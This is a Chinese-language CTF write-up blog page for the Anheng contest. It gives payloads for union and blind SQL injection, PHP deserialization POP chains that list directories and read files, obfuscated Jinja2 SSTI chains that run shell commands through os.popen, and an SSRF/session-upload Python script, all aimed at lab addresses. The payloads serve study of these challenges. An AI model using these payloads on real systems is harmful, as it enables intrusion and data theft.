@@ -1,0 +1,266 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>安恒赛 - m4ao&#39;s blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="love_sql无列名注入，对flag 内容过滤 
+1http://10.13.120.16/content.php?id=-2 union select 1,2,(select to_base64,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="m4ao&#39;s blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="安恒赛 - m4ao&#39;s blog"/>
+    <meta name="twitter:description" content="love_sql无列名注入，对flag 内容过滤 
+1http://10.13.120.16/content.php?id=-2 union select 1,2,(select to_base64,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="m4ao&#39;s blog"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="安恒赛 - m4ao&#39;s blog"/>
+    <meta property="og:description" content="love_sql无列名注入，对flag 内容过滤 
+1http://10.13.120.16/content.php?id=-2 union select 1,2,(select to_base64,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script>window.searchDbPath = "/search.xml";</script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">m4ao&#39;s blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">安恒赛</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">安恒赛</h1>
+        <div class="stuff">
+            <span>七月 26, 2023</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h2 id="love-sql"><a href="#love-sql" class="headerlink" title="love_sql"></a>love_sql</h2><p>无列名注入，对flag 内容过滤 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.13</span><span class="number">.120</span><span class="number">.16</span><span class="operator">/</span>content.php?id<span class="operator">=</span><span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> to_base64(group_concat(`<span class="number">2</span>`)) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag)a)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/26/%E5%AE%89%E6%81%92%E8%B5%9B/image-20230214195545263.png" alt="image-20230214195545263"></p>
+<h2 id="PPPOP"><a href="#PPPOP" class="headerlink" title="PPPOP"></a>PPPOP</h2><p>pop 链如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp2</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp2</span>;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A4</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp1</span> = <span class="string">&#x27;1919810&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp2</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A6</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp2</span>;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A8</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hack4fun</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Last step,Ganbadie~&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;DAS&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tmp1 = <span class="variable">$_GET</span>[<span class="string">&#x27;DAS&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tmp2 = <span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">tmp1</span>(<span class="variable">$this</span>-&gt;tmp2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//A1 -&gt; A3 -&gt; A4 -&gt; A6 -&gt;A8</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">A1</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">A3</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">A4</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">A6</span>;</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="title class_">A8</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> -&gt; tmp1 = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; tmp2 = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span> -&gt; tmp1 = <span class="variable">$d</span>; </span><br><span class="line"><span class="variable">$d</span> -&gt; tmp1 = <span class="variable">$e</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="原生类目录遍历"><a href="#原生类目录遍历" class="headerlink" title="原生类目录遍历"></a>原生类目录遍历</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.13.120.13/?DASCTF=O:2:&quot;A1&quot;:2:&#123;s:4:&quot;tmp1&quot;;O:2:&quot;A3&quot;:2:&#123;s:4:&quot;tmp1&quot;;N;s:4:&quot;tmp2&quot;;O:2:&quot;A4&quot;:2:&#123;s:4:&quot;tmp1&quot;;O:2:&quot;A6&quot;:2:&#123;s:4:&quot;tmp1&quot;;O:2:&quot;A8&quot;:2:&#123;s:4:&quot;tmp1&quot;;N;s:4:&quot;tmp2&quot;;N;&#125;s:4:&quot;tmp2&quot;;N;&#125;s:4:&quot;tmp2&quot;;N;&#125;&#125;s:4:&quot;tmp2&quot;;N;&#125;&amp;DAS=FilesystemIterator&amp;CTF=./</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/26/%E5%AE%89%E6%81%92%E8%B5%9B/image-20230214211305148.png" alt="image-20230214211305148"></p>
+<h3 id="原生类文件读取"><a href="#原生类文件读取" class="headerlink" title="原生类文件读取"></a>原生类文件读取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL</span><br><span class="line">http://10.13.120.13/?DASCTF=O:2:&quot;A1&quot;:2:&#123;s:4:&quot;tmp1&quot;;O:2:&quot;A3&quot;:2:&#123;s:4:&quot;tmp1&quot;;N;s:4:&quot;tmp2&quot;;O:2:&quot;A4&quot;:2:&#123;s:4:&quot;tmp1&quot;;O:2:&quot;A6&quot;:2:&#123;s:4:&quot;tmp1&quot;;O:2:&quot;A8&quot;:2:&#123;s:4:&quot;tmp1&quot;;N;s:4:&quot;tmp2&quot;;N;&#125;s:4:&quot;tmp2&quot;;N;&#125;s:4:&quot;tmp2&quot;;N;&#125;&#125;s:4:&quot;tmp2&quot;;N;&#125;&amp;DAS=SplFileObject&amp;CTF=php://filter/convert.base64-encode/resource=flaggggggggggg.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/26/%E5%AE%89%E6%81%92%E8%B5%9B/image-20230214211619733.png" alt="image-20230214211619733"></p>
+<h2 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h2><h3 id="原生类目录遍历-1"><a href="#原生类目录遍历-1" class="headerlink" title="原生类目录遍历"></a>原生类目录遍历</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = &quot;<span class="title">FilesystemIterator</span>&quot;;</span></span><br><span class="line"><span class="class">        $<span class="title">this</span>-&gt;<span class="title">para</span> = &quot;/&quot;;</span></span><br><span class="line"><span class="class">        <span class="title">echo</span> <span class="title">new</span>  $<span class="title">this</span>-&gt;<span class="title">class</span> ($<span class="title">this</span>-&gt;<span class="title">para</span>);</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">   </span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">$<span class="title">a</span> = <span class="title">new</span> <span class="title">A</span>;</span></span><br><span class="line"><span class="class"><span class="title">echo</span> <span class="title">serialize</span>($<span class="title">a</span>)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE&#x2F;flag.php</p>
+<p><img src="/2023/07/26/%E5%AE%89%E6%81%92%E8%B5%9B/image-20230215201324709.png" alt="image-20230215201324709"></p>
+<h3 id="原生类文件读取-1"><a href="#原生类文件读取-1" class="headerlink" title="原生类文件读取"></a>原生类文件读取</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&#x27;SplFileObject&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span> = <span class="string">&#x27;/var/www/html/1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="baby-flask"><a href="#baby-flask" class="headerlink" title="baby_flask"></a>baby_flask</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set id=dict(ind=a,ex=a)|join%&#125;&#123;% set pp=dict(po=a,p=a)|join%&#125;&#123;% set ls=dict(ls=a)|join%&#125;&#123;% set ppe=dict(po=a,pen=a)|join%&#125;&#123;% set gt=dict(ge=a,t=a)|join%&#125;&#123;% set cr=dict(ch=a,r=a)|join%&#125;&#123;% set nn=dict(n=a)|join%&#125;&#123;% set tt=dict(t=a)|join%&#125;&#123;% set ff=dict(f=a)|join%&#125;&#123;% set ooqq=dict(o=a,s=a)|join %&#125;&#123;% set rd=dict(re=a,ad=a)|join%&#125;&#123;% set five=(lipsum|string|list)|attr(id)(tt) %&#125;&#123;% set three=(lipsum|string|list)|attr(id)(nn) %&#125;&#123;% set one=(lipsum|string|list)|attr(id)(ff) %&#125;&#123;% set shiba=five*five-three-three-one %&#125;&#123;% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %&#125;&#123;% set gb=(xiahuaxian,xiahuaxian,dict(glob=a,als=a)|join,xiahuaxian,xiahuaxian)|join %&#125;&#123;% set bin=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join %&#125;&#123;% set chcr=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;&#123;% set xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%&#125;&#123;% set space=chcr(three*three*five-five-five-three) %&#125;&#123;% set shell=(ls,space,xiegang,dict(var=a)|join,xiegang,dict(www=a)|join,xiegang,dict(flask=a)|join)|join %&#125;&#123;&#123;(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/?key=&#123;&#123;lipsum.__globals__.get(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/26/%E5%AE%89%E6%81%92%E8%B5%9B/image-20230216174254059.png" alt="image-20230216174254059"></p>
+<h3 id="字符构造"><a href="#字符构造" class="headerlink" title="字符构造"></a>字符构造</h3><h4 id="数字构造"><a href="#数字构造" class="headerlink" title="数字构造"></a>数字构造</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/?key=&#123;&#123;(lipsum|string|list).index(&#x27;f&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/26/%E5%AE%89%E6%81%92%E8%B5%9B/image-20230216174757047.png" alt="image-20230216174757047"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/?key=&#123;% set id=dict(ind=a,ex=a)|join%&#125;</span><br><span class="line">&#123;% set pp=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set nn=dict(n=a)|join%&#125;</span><br><span class="line">&#123;% set tt=dict(t=a)|join%&#125;</span><br><span class="line">&#123;% set ff=dict(f=a)|join%&#125;</span><br><span class="line">&#123;% set five=(lipsum|string|list)|attr(id)(tt) %&#125;</span><br><span class="line">&#123;% set three=(lipsum|string|list)|attr(id)(nn) %&#125;</span><br><span class="line">&#123;% set one=(lipsum|string|list)|attr(id)(ff) %&#125;</span><br><span class="line">&#123;% set shiba=five*five-three-three-one %&#125;</span><br><span class="line">&#123;% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %&#125;</span><br><span class="line">&#123;&#123;xiahuaxian&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/26/%E5%AE%89%E6%81%92%E8%B5%9B/image-20230216175858912.png" alt="image-20230216175858912"></p>
+<p>相当于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lipsum|string|list).pop(18)</span><br></pre></td></tr></table></figure>
+
+<h4 id="最终payload"><a href="#最终payload" class="headerlink" title="最终payload"></a>最终payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set id=dict(ind=a,ex=a)|join%&#125;</span><br><span class="line">&#123;% set pp=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set ls=dict(ls=a)|join%&#125;</span><br><span class="line">&#123;% set ppe=dict(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;% set gt=dict(ge=a,t=a)|join%&#125;</span><br><span class="line">&#123;% set cr=dict(ch=a,r=a)|join%&#125;</span><br><span class="line">&#123;% set nn=dict(n=a)|join%&#125;</span><br><span class="line">&#123;% set tt=dict(t=a)|join%&#125;</span><br><span class="line">&#123;% set ff=dict(f=a)|join%&#125;</span><br><span class="line">&#123;% set ooqq=dict(o=a,s=a)|join %&#125;</span><br><span class="line">&#123;% set rd=dict(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;% set five=(lipsum|string|list)|attr(id)(tt) %&#125;</span><br><span class="line">&#123;% set three=(lipsum|string|list)|attr(id)(nn) %&#125;</span><br><span class="line">&#123;% set one=(lipsum|string|list)|attr(id)(ff) %&#125;</span><br><span class="line">&#123;% set shiba=five*five-three-three-one %&#125;</span><br><span class="line">&#123;% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %&#125;</span><br><span class="line">&#123;% set gb=(xiahuaxian,xiahuaxian,dict(glob=a,als=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set bin=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set chcr=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;</span><br><span class="line">&#123;% set xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%&#125;</span><br><span class="line">&#123;% set space=chcr(three*three*five-five-five-three) %&#125;</span><br><span class="line">&#123;% set shell=(ls,space,xiegang,dict(var=a)|join,xiegang,dict(www=a)|join,xiegang,dict(flask=a)|join)|join %&#125;</span><br><span class="line">&#123;&#123;(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat(table_name)/**/from/**/information_schema.tables_where/**/table_schema=database()</span><br></pre></td></tr></table></figure>
+
+<h2 id="EZssti"><a href="#EZssti" class="headerlink" title="EZssti"></a>EZssti</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[84][&quot;load_module&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[84]|attr(&quot;__get&quot;+&quot;item__&quot;)(&quot;load_&quot;+&quot;module&quot;)(&quot;os&quot;)|attr(&quot;__get&quot;+&quot;item__&quot;)(&quot;p&quot;+&quot;open&quot;)(&quot;whoami&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(&quot;__cla&quot;+&quot;ss__&quot;)|attr(&quot;__bas&quot;+&quot;e__&quot;)|attr(&quot;__subcl&quot;+&quot;ass&quot;+&quot;es__&quot;)()|attr(&quot;__get&quot;+&quot;item__&quot;)(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true)|attr(&quot;__get&quot;+&quot;item__&quot;)(&quot;load_&quot;+&quot;module&quot;)(&quot;o&quot;+&quot;s&quot;)|attr(&quot;__get&quot;+&quot;item__&quot;)(&quot;p&quot;+&quot;open&quot;)(&#x27;whoami&#x27;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = &quot;http://127.0.0.1:5000?code=&#123;&#123;()|attr(\&quot;__cla\&quot;%2B\&quot;ss__\&quot;)|attr(\&quot;__bas\&quot;%2B\&quot;e__\&quot;)|attr(\&quot;__subcl\&quot;%2B\&quot;ass\&quot;%2B\&quot;es__\&quot;)()|attr(\&quot;__get\&quot;%2B\&quot;item__\&quot;)(&quot;+str(number)+&quot;)&#125;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">找 _frozen_importlib.BuiltinImporter</span><br><span class="line">&#123;&#123;lipsum.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;lipsum.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="ez-login"><a href="#ez-login" class="headerlink" title="ez_login"></a>ez_login</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress是php&gt;=5.4添加的。最初是PHP为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在session中（包含用户可控的值），即使此时用户没有初始化session，PHP也会自动初始化session。 而且，默认情况下session.upload_progress.enabled是为开启的</span><br></pre></td></tr></table></figure>
+
+<p>内网访问 admin.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import io</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">sessid = &quot;m4ao&quot;</span><br><span class="line">url =&quot;http://10.13.120.33/?url=http://localhost/admin.php&quot;</span><br><span class="line">f = io.BytesIO(b&#x27;a&#x27;*1024*50)</span><br><span class="line">data = &#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:f&quot;&#123;sessid&#125;&quot;&#125;</span><br><span class="line">file = &#123;&#x27;file&#x27;:(&#x27;m4ao.txt&#x27;,f)&#125;</span><br><span class="line">cookies = &#123;&#x27;PHPSESSID&#x27;:sessid&#125;</span><br><span class="line">r = requests.post(url=url,data=data,files=file,cookies=cookies)</span><br><span class="line">print(r.request.body.decode(&#x27;utf-8&#x27;))</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/26/%E5%AE%89%E6%81%92%E8%B5%9B/image-20230303202955154.png" alt="image-20230303202955154"></p>
+<p>构造上传包</p>
+<p><img src="/2023/07/26/%E5%AE%89%E6%81%92%E8%B5%9B/image-20230303204950133.png" alt="image-20230303204950133"></p>
+<p>?username&#x3D;m4a0’or ascii(mid((select flag from ctf.secret),{},1))&#x3D;{}%23password&#x3D;m4a0</p>
